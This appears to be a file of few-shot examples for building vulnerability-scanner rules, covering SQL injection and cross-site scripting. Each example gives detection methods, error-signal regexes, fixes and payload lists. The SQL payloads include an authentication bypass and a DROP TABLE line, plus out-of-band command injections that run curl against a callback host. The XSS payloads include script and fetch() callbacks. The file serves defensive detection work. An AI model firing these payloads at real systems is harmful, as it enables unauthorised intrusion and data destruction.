# Few-Shot Examples 

## Example 1: SQL Injection

```json
{
  "vulnerability": {
    "name": "SQL Injection",
    "cwe_id": "CWE-89",
    "wstg_id": "WSTG-INPV-05",
    "description": "SQL Injection occurs when user input is directly concatenated into SQL queries without validation or parameterized queries. Attackers can manipulate SQL to bypass authentication, steal data, modify/delete records, or execute OS commands. This vulnerability affects all SQL databases (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and remains in OWASP Top 10 due to its critical severity.",
    "impact": "CRITICAL - Attackers can read entire database (passwords, PII, financial data), modify/delete data, escalate to admin privileges, or compromise the entire server. Violates GDPR (fines up to €20M), PCI-DSS, causes reputation damage and customer trust loss.",
    "detection_methods": "1. Error-based: Inject SQL metacharacters (' \" \\) to trigger errors and analyze database error messages\n\n2. Boolean-based blind: Send payloads that alter query logic (true/false conditions) and compare response differences\n\n3. Time-based blind: Inject sleep functions (SLEEP, pg_sleep, WAITFOR) and measure response time delays\n\n4. Union-based: Use UNION SELECT to extract data by combining query results\n\n5. Out-of-band: Use DNS exfiltration or HTTP callbacks to confirm blind injection",
    "payloads": "[1] ' — Basic single quote to break string context\n\n[2] \" — Double quote for alternate delimiter\n\n[3] ' OR '1'='1 — Always true condition to bypass authentication\n\n[4] ' OR '1'='2 — Always false condition for blind boolean testing\n\n[5] admin'-- — Comment out remainder of query\n\n[6] ' UNION SELECT NULL-- — Union-based injection starter\n\n[7] ' AND 1=1-- — True condition (response should be normal)\n\n[8] ' AND 1=2-- — False condition (response should differ)\n\n[9] ' OR SLEEP(5)-- — MySQL time-based blind injection\n\n[10] '; WAITFOR DELAY '0:0:5'-- — MSSQL time delay",
    "indicators": "[1] SQL syntax.*error — Generic SQL error\n\n[2] mysql_fetch_array\\(\\) — PHP MySQL error\n\n[3] Warning.*mysql.* — MySQL warning message\n\n[4] PostgreSQL.*ERROR — PostgreSQL error\n\n[5] ORA-[0-9]{5} — Oracle error code\n\n[6] Microsoft.*ODBC.*SQL Server — MSSQL error\n\n[7] SQLite3::SQLException — SQLite exception\n\n[8] You have an error in your SQL syntax — MySQL classic error\n\n[9] SQLSTATE\\[\\w+\\] — PDO SQL state error\n\n[10] java\\.sql\\.SQLException — Java SQL exception"
  },
  "config_info": {
    "metadata": {
      "id": 40018,
      "name": "SQL Injection - Comprehensive Detection",
      "description": "Detects SQL injection vulnerabilities using error-based, boolean-based blind, time-based blind, and OAST techniques across all database types",
      "solution": "PRIMARY FIX: Use parameterized queries (prepared statements) for ALL database operations. NEVER concatenate user input into SQL strings. ADDITIONAL MEASURES: Validate input with whitelists, apply least privilege for database accounts, enable query logging, deploy WAF with SQL injection rules, conduct regular code reviews.",
      "category": "INJECTION",
      "risk": "HIGH",
      "confidence": "HIGH",
      "cweId": 89,
      "wascId": 19
    },
    "config": {
      "error": {
        "payloads": [
          "'",
          "\"",
          "' OR '1'='1",
          "' AND '1'='2",
          "admin'--",
          "' UNION SELECT NULL--",
          "'; DROP TABLE test--",
          "1' ORDER BY 5--",
          "\\' OR \\'1\\'=\\'1",
          "') OR ('1'='1",
          "' OR 1=1#",
          "%27%20OR%201=1--"
        ],
        "signals": [
          "SQL syntax.*error",
          "mysql_fetch_array\\(\\)",
          "Warning.*mysql.*",
          "PostgreSQL.*ERROR",
          "ORA-[0-9]{5}",
          "Microsoft.*ODBC.*SQL Server",
          "SQLite3::SQLException",
          "org\\.postgresql\\.util\\.PSQLException",
          "com\\.mysql\\.jdbc\\.exceptions",
          "Incorrect syntax near",
          "You have an error in your SQL syntax",
          "SQLSTATE\\[\\w+\\]"
        ]
      },
      "boolean": {
        "truePayload": "' OR '1'='1",
        "falsePayload": "' AND '1'='2"
      },
      "time": {
        "payload": "' OR SLEEP(5)--",
        "delayMs": 5000
      },
      "oast": {
        "payloads": [
          "'; curl {{oast}} #",
          "\"; curl {{oast}} #",
          "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{{oast}},'\\\\'))--",
          "admin' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a UNION SELECT LOAD_FILE(CONCAT('http://',{{oast}})))--",
          "`curl {{oast}}`",
          "$(curl {{oast}})",
          "1' AND 1=UTL_HTTP.REQUEST('{{oast}}')--"
        ]
      },
      "enabled": {
        "error": true,
        "boolean": true,
        "time": true,
        "oast": true
      }
    }
  }
}
```

## Example 2: Cross-Site Scripting (XSS)

```json
{
  "vulnerability": {
    "name": "Cross-Site Scripting (XSS)",
    "cwe_id": "CWE-79",
    "wstg_id": "WSTG-INPV-01",
    "description": "XSS allows attackers to inject malicious JavaScript into web pages. Occurs when applications display user input without proper escaping/validation. Three types: Reflected (immediate response), Stored (persisted in database), DOM-based (client-side JavaScript manipulation). Modern frameworks have auto-escaping but remain vulnerable through dangerouslySetInnerHTML, v-html. XSS enables session hijacking, credential theft, phishing, and malware distribution.",
    "impact": "HIGH - Attackers can steal session cookies (document.cookie), keylog sensitive data, create fake login forms, deface websites, redirect to phishing sites. Causes user account compromise, brand reputation damage, and legal liability. Violates PCI-DSS 6.5.7, OWASP ASVS 5.3.3.",
    "detection_methods": "1. Reflected XSS: Inject script tags in URL parameters and check for execution\n\n2. Stored XSS: Submit payloads to input fields and verify persistence on page reload\n\n3. DOM-based XSS: Test URL fragments and JavaScript sinks (innerHTML, eval, setTimeout)\n\n4. Event handler injection: Use onclick, onerror, onload attributes\n\n5. WAF bypass: Test case variations, encoding tricks, HTML comments",
    "payloads": "[1] <script>alert('XSS')</script> — Basic script injection\n\n[2] <img src=x onerror=alert('XSS')> — Image error handler\n\n[3] <svg onload=alert('XSS')> — SVG-based XSS\n\n[4] <iframe src=javascript:alert('XSS')> — JavaScript protocol\n\n[5] <body onload=alert('XSS')> — Body event handler\n\n[6] <input onfocus=alert('XSS') autofocus> — Input focus event\n\n[7] ';alert('XSS')// — Quote breaking\n\n[8] </script><script>alert('XSS')</script> — Tag breaking\n\n[9] <ScRiPt>alert('XSS')</sCrIpT> — Case variation\n\n[10] %3Cscript%3Ealert('XSS')%3C/script%3E — URL encoding",
    "indicators": "[1] <script.*?>.*?</script> — Script tag pattern\n\n[2] javascript: — JavaScript protocol\n\n[3] onerror\\s*= — Error event handler\n\n[4] onload\\s*= — Load event handler\n\n[5] onclick\\s*= — Click event handler\n\n[6] <img.*?onerror — Image with error handler\n\n[7] <svg.*?onload — SVG with onload\n\n[8] eval\\( — Eval function\n\n[9] document\\.cookie — Cookie access\n\n[10] innerHTML\\s*= — InnerHTML assignment"
  },
  "config_info": {
    "metadata": {
      "id": 40019,
      "name": "Cross-Site Scripting (XSS) Detection",
      "description": "Detects reflected, stored, and DOM-based XSS vulnerabilities by injecting JavaScript payloads and analyzing response context",
      "solution": "PRIMARY FIX: Implement context-aware output encoding for ALL user input (HTML, JavaScript, URL, CSS encoding). Use Content Security Policy (CSP) headers. ADDITIONAL MEASURES: Use modern frameworks with auto-escaping (React, Vue, Angular), validate input with whitelists, set HTTPOnly and Secure flags on cookies, use DOMPurify to sanitize HTML, avoid eval() and innerHTML.",
      "category": "XSS",
      "risk": "HIGH",
      "confidence": "HIGH",
      "cweId": 79,
      "wascId": 8
    },
    "config": {
      "error": {
        "payloads": [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert('XSS')>",
          "<svg onload=alert('XSS')>",
          "<iframe src=javascript:alert('XSS')>",
          "<body onload=alert('XSS')>",
          "<input onfocus=alert('XSS') autofocus>",
          "';alert('XSS')//",
          "\";alert('XSS')//",
          "</script><script>alert('XSS')</script>",
          "<ScRiPt>alert('XSS')</sCrIpT>"
        ],
        "signals": [
          "<script.*?>.*?</script>",
          "javascript:",
          "onerror\\s*=",
          "onload\\s*=",
          "onclick\\s*=",
          "<img.*?onerror",
          "<svg.*?onload",
          "<iframe.*?src",
          "eval\\(",
          "document\\.cookie",
          "innerHTML\\s*="
        ]
      },
      "boolean": {
        "truePayload": "",
        "falsePayload": ""
      },
      "time": {
        "payload": "",
        "delayMs": 0
      },
      "oast": {
        "payloads": [
          "<img src='{{oast}}'>",
          "<script src='{{oast}}'></script>",
          "<iframe src='{{oast}}'></iframe>",
          "<link rel='stylesheet' href='{{oast}}'>",
          "<object data='{{oast}}'></object>",
          "<embed src='{{oast}}'>",
          "<script>fetch('{{oast}}')</script>",
          "<img src=x onerror='fetch(\"{{oast}}\")'>"
        ]
      },
      "enabled": {
        "error": true,
        "boolean": false,
        "time": false,
        "oast": true
      }
    }
  }
}
```